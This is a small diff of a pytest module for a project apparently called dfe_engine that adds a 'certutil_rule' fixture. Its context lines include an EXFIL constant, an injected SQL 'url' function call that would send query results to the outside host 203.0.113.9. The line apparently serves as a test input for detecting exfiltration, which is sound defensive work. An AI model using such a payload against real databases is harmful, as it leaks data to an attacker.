@@ -18,7 +18,7 @@ import pytest
 from dfe_engine.gitcrud import GitCrud, default_registry
 from dfe_engine.gitops.repo import GitopsRepo
 
-pytestmark = pytest.mark.usefixtures("customer_orgs")
+pytestmark = pytest.mark.usefixtures("customer_orgs", "certutil_rule")
 
 EXFIL = "FUNCTION url('http://203.0.113.9/x', 'JSONEachRow') -- .x"
 
